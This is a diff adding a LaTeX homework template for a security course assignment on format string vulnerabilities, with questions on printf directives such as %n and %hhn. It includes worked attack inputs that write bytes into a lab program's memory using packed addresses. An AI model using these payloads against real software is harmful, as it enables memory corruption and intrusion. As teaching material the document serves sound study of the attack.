@@ -1,0 +1,205 @@
+\documentclass{article}[9pt]
+
+\usepackage{listings}
+\usepackage{fullpage}
+\usepackage{textcomp}
+
+\lstset{ %
+  basicstyle=\ttfamily\small,
+  commentstyle=\ttfamily\small\emph,
+  upquote=true,
+  framerule=1.25pt,
+  breaklines=true,
+  showstringspaces=false,
+  escapeinside={(*@}{@*)},
+  belowskip=2em,
+  aboveskip=1em,
+}
+
+
+\newenvironment{answerfont}{\fontfamily{qhv}\selectfont}{\par}
+\newenvironment{myanswer}{\begin{mdframed}\begin{answerfont}}{\end{answerfont}\end{mdframed}}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%
+% To add an answer, use the myanswer environment command under \item heading,like
+%
+% \item What is the meaning of life, universe, everything?
+% \begin{mysanswer}
+%   The answer is 42!
+% \end{myanswer}
+%
+% You can also use macro's in your \myanswer if you want to control the
+% formatting. Such as verbatim enviroment or lstlisting environment.
+%
+% BUT(!) I have to be able to read/grade your resulting pdf to give you credit,
+% so make sure your home work is well formatted.
+%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\title{SI485h: HW 07}
+\date{FILL IN THE DUE DATE}
+\author{FILL IN YOUR NAME}
+
+\begin{document}
+
+\maketitle
+\section*{Instructions}
+
+\begin{itemize}
+\item You must submit your homework using this Latex template.
+
+\item This homework is graded out of 70 points. Point values are associated to each question.
+\end{itemize}
+
+\section*{Questions}
+\label{sec:org21d4a36}
+
+\begin{enumerate}
+\item Describe, briefly, what each of the formats present the
+result. For example, you might say for "\%s" that it format prints
+a string, and for "\%2s" you might say that it prints 2 bytes of a
+string.
+
+\begin{enumerate}
+\item \texttt{\%n}
+
+\item \texttt{\%hn}
+
+\item \texttt{\%hhn}
+
+\item \texttt{\%hhx}
+
+\item \texttt{\%10\$x}
+
+\item \texttt{\%p}
+
+\item \texttt{\%08x}
+
+\item \texttt{\%8x}
+
+\item \texttt{\%03.2f}
+\end{enumerate}
+
+\item What is the output from the following example format? \textbf{Explain.}
+
+\begin{verbatim}
+int a;
+printf(“%0.10s%n\n”, “Go Navy! Beat Army!”, &a);
+printf(“%d”,a);
+\end{verbatim}
+
+\item Consider the following program code
+
+\begin{verbatim}
+int i=0;
+int a;
+char buf[100];
+while( scanf(“%s%n”,buf,&a) > 0){
+  printf(“%#x: %s (%d)”, i, buf, a);
+
+ }     
+\end{verbatim}
+
+What do you expect the output of the second \texttt{printf()} will be
+given some user's input? \textbf{Explain}.
+
+\item Consider the following code:
+
+\begin{verbatim}
+char outputbuf[128];
+sprintf(outputbuf,inputbuf)
+\end{verbatim}
+
+Provide a format for \texttt{inputbuf} that uses a \uline{single} \%
+directective that overflows outputbuf by 5 bytes. \textbf{Explain why
+this works.}
+
+\item For the following format print below why does this print \texttt{d}? Use
+a stack digram to help explain.
+
+\begin{verbatim}
+void foo(int d){
+  printf("The value of d is: %10$d\n");
+}
+\end{verbatim}
+
+\item Consider the following code:
+
+\begin{verbatim}
+void foo(){
+   int d = 10;
+   printf("The value of d is: %d\n",d);
+   printf("%x\n");
+}
+\end{verbatim}
+
+What do you expect the output of the second \texttt{printf()} will be? \textbf{Explain}.
+
+\item When conducting a format string attack, consider the following
+format and output:
+
+\begin{verbatim}
+$ ./fmt_vuln BBBB.%#08x.%#08x.%#08x.%#08x
+
+Right: BBBB.%#08x.%#08x.%#08x.%#08x
+
+Wrong: BBBB.0xbffff2b0.0x000400.0x000004.0x42424242
+
+[*] test_val @ 0x804a02c = 4276545 0x00414141 
+\end{verbatim}
+
+What about \texttt{Wrong} output is instructive about what is currently
+be referenced by the last \%\#08x format directive?
+
+\item Consider the format string attack below:
+
+\begin{verbatim}
+$ ./fmt_vuln $(printf "\x2c\xa0\x04\x08").%#08x.%#08x.%#08x.%hhn
+
+Right: ,.%#08x.%#08x.%#08x.%hhn
+
+Wrong: ,.0xbffff2b0.0x000400.0x000004.
+
+[*] test_val @ 0x804a02c = 4276514 0x00414122
+\end{verbatim}
+
+Explain how the \texttt{\$(printf "\textbackslash{}x2c\textbackslash{}xa0\textbackslash{}x04\textbackslash{}x08")} and the \texttt{\%hhn}
+format directive allows the attacker to write a single byte
+
+\item Consider the format string attack below:
+
+\begin{verbatim}
+user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")AAAAAAAAAAAAAAAAAAAAAAA.%#08x.%#08x.%#08x.%hhn
+
+Right: /AAAAAAAAAAAAAAAAAAAAAAA.%#08x.%#08x.%#08x.%hhn
+
+Wrong: /AAAAAAAAAAAAAAAAAAAAAAA.0xbffff290.0x000400.0x000004.
+
+[*] test_val @ 0x804a02c = 960577857 0x39414141
+\end{verbatim}
+
+If we wanted 0x99 to be the value instead of 0x39 when writing
+the byte, what would we change the format directive to be? \textbf{Explain.}
+
+\item Consider the below format string attack input: (note: lines ending with $\backslash$ are continuations)
+
+\begin{verbatim}
+$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")\
+$(printf "\x2e\xa0\x04\x08")\
+$(printf "\x2d\xa0\x04\x08")\
+$(printf "\x2c\xa0\x04\x08")\
+.%4\$08x.%4\$08x.%5\$08x.%\5\$08x.%6\$08x.%\6\$08x.%7\$08x.%\7\$08x
+\end{verbatim}
+
+\begin{enumerate}
+\item Which of the format directives should be chnaged to \texttt{\%hhn}? \textbf{Explain.}
+
+\item Why are all the format lengths predsecribed prior to changing
+to \texttt{\%hhn}? What would happen if we built the format length one
+part at a time?
+
+\item Explain why the $\backslash$$ portion of the format? What is it used for
+in the format directive? And, why is it escaped with a $\backslash$ ?
+\end{enumerate}
+\end{enumerate}
+\end{document}
